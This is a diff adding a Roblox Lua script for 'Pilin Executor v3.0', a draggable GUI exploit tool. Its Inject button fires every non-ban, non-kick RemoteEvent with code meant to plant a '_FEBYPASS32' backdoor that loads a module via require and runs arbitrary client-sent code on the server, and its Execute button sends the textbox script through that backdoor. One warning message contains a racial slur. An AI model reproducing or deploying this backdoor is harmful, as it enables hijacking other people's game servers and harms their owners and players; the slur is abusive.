@@ -1,0 +1,209 @@
+local PilinExecutor = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local ExecuteButton = Instance.new("TextButton")
+local ClearButton = Instance.new("TextButton")
+local InjectButton = Instance.new("TextButton")
+local ScriptBox = Instance.new("TextBox")
+local UICorner = Instance.new("UICorner")
+local UIStroke = Instance.new("UIStroke")
+local DecorationImage = Instance.new("ImageLabel")
+
+PilinExecutor.Name = "PilinExecutor"
+PilinExecutor.ResetOnSpawn = false
+PilinExecutor.Parent = game.CoreGui
+
+local TRUE_BLACK = Color3.fromRGB(0, 0, 0)
+local RICH_ORANGE = Color3.fromRGB(255, 85, 0)
+
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = PilinExecutor
+MainFrame.BackgroundColor3 = TRUE_BLACK
+MainFrame.Size = UDim2.new(0, 500, 0, 250)
+MainFrame.Position = UDim2.new(0.3, 0, 0.3, 0)
+MainFrame.Active = true
+MainFrame.Selectable = true
+
+UIStroke.Parent = MainFrame
+UIStroke.Color = RICH_ORANGE
+UIStroke.Thickness = 2.5
+
+UICorner.Parent = MainFrame
+UICorner.CornerRadius = UDim.new(0, 8)
+
+DecorationImage.Name = "DecorationImage"
+DecorationImage.Parent = MainFrame
+DecorationImage.BackgroundTransparency = 1
+DecorationImage.Size = UDim2.new(0, 32, 0, 32)
+DecorationImage.Position = UDim2.new(0.01, 5, 0.02, 0)
+DecorationImage.Image = "rbxassetid://17812418693"
+DecorationImage.ScaleType = Enum.ScaleType.Fit
+DecorationImage.ZIndex = 2
+
+local titleText = "PILIN EXECUTOR v3.0"
+Title.Name = "Title"
+Title.Parent = MainFrame
+Title.Text = ""
+Title.Size = UDim2.new(0.75, 0, 0.15, 0)
+Title.Position = UDim2.new(0.12, 0, 0.02, 0)
+Title.TextSize = 18
+Title.TextColor3 = RICH_ORANGE
+Title.BackgroundTransparency = 1
+Title.Font = Enum.Font.GothamBlack
+Title.TextStrokeTransparency = 0.8
+Title.TextXAlignment = Enum.TextXAlignment.Left
+
+spawn(function()
+    for i = 1, #titleText do
+        Title.Text = string.sub(titleText, 1, i)
+        wait(0.08)
+    end
+end)
+
+ScriptBox.Name = "ScriptBox"
+ScriptBox.Parent = MainFrame
+ScriptBox.Size = UDim2.new(0.9, 0, 0.5, 0)
+ScriptBox.Position = UDim2.new(0.05, 0, 0.2, 0)
+ScriptBox.MultiLine = true
+ScriptBox.BackgroundColor3 = TRUE_BLACK
+ScriptBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScriptBox.Text = ""
+ScriptBox.ClearTextOnFocus = false
+ScriptBox.Font = Enum.Font.RobotoMono
+ScriptBox.TextSize = 13
+ScriptBox.TextXAlignment = Enum.TextXAlignment.Left
+ScriptBox.TextYAlignment = Enum.TextYAlignment.Top
+
+local TextBoxStroke = Instance.new("UIStroke")
+TextBoxStroke.Parent = ScriptBox
+TextBoxStroke.Color = RICH_ORANGE
+TextBoxStroke.Thickness = 1.5
+
+local function CreateButton(name, position)
+    local button = Instance.new("TextButton")
+    button.Name = name
+    button.Parent = MainFrame
+    button.Size = UDim2.new(0.3, 0, 0.15, 0)
+    button.Position = position
+    button.Text = name
+    button.BackgroundColor3 = TRUE_BLACK
+    button.TextColor3 = RICH_ORANGE
+    button.Font = Enum.Font.GothamBold
+    button.AutoButtonColor = false
+    button.TextSize = 14
+
+    local buttonCorner = Instance.new("UICorner")
+    buttonCorner.CornerRadius = UDim.new(0, 6)
+    buttonCorner.Parent = button
+
+    local buttonStroke = Instance.new("UIStroke")
+    buttonStroke.Parent = button
+    buttonStroke.Color = RICH_ORANGE
+    buttonStroke.Thickness = 2  
+
+    button.MouseEnter:Connect(function()
+        button.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+    end)
+
+    button.MouseLeave:Connect(function()
+        button.BackgroundColor3 = TRUE_BLACK
+    end)
+
+    return button
+end
+
+ExecuteButton = CreateButton("Execute", UDim2.new(0.05, 0, 0.75, 0))
+ClearButton = CreateButton("Clear", UDim2.new(0.37, 0, 0.75, 0))
+InjectButton = CreateButton("Inject", UDim2.new(0.69, 0, 0.75, 0))
+
+ClearButton.MouseButton1Click:Connect(function()
+    ScriptBox.Text = ""
+end)
+
+local isInjected = false
+InjectButton.MouseButton1Click:Connect(function()
+    local function b_G_V12(see)
+        local a = function(ree)
+            ree:FireServer([[
+                local folder = Instance.new('RemoteEvent')
+                folder.Name = "_FEBYPASS32"
+                folder.Parent = game:GetService("JointsService")
+                local loadstring = require(13684410229)
+                folder.OnServerEvent:Connect(function(_1,_2)
+                   loadstring(_2)()
+                end)
+                ]]
+            )
+        end
+        for i, v in pairs(see:GetChildren()) do
+            if v:IsA("RemoteEvent") then
+                if not string.match(string.lower(v.Name), "ban") then
+                    if not string.match(string.lower(v.Name), "kick") then
+                        a(v)
+                    end
+                end
+            end
+            b_G_V12(v)
+        end
+    end
+    local Inject = b_G_V12(game:GetService("ReplicatedStorage"))
+    local timetoken = 0
+    local maxtime = 5
+    repeat wait(0.1) timetoken += 0.1 until game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") or timetoken >= maxtime
+    if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+        InjectButton.Text = "Injected"
+        isInjected = true
+    else
+        warn("INJECT FAILED HAHAHAHAHAH")
+    end
+end)
+
+ExecuteButton.MouseButton1Click:Connect(function()
+    if isInjected then
+        if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+            local Execute=game:GetService("JointsService"):FindFirstChild("_FEBYPASS32"):FireServer(ScriptBox.Text)
+        else
+            warn("Skid, failed to use loadstring use require instead")
+        end
+    else
+        warn("INJECT FIRST NIGGER SKID EZ")
+    end
+end)
+
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+
+local dragging
+local dragInput
+local dragStart
+local startPos
+
+MainFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+MainFrame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+RunService.RenderStepped:Connect(function()
+    if dragging and dragInput then
+        local delta = Vector2.new(dragInput.Position.X, dragInput.Position.Y) - Vector2.new(dragStart.X, dragStart.Y)
+        MainFrame.Position = UDim2.new(
+            startPos.X.Scale, startPos.X.Offset + delta.X,
+            startPos.Y.Scale, startPos.Y.Offset + delta.Y
+        )
+    end
+end)
